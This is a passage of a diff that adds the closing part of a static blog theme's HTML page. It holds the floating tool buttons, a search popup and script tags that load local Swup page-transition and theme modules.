+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
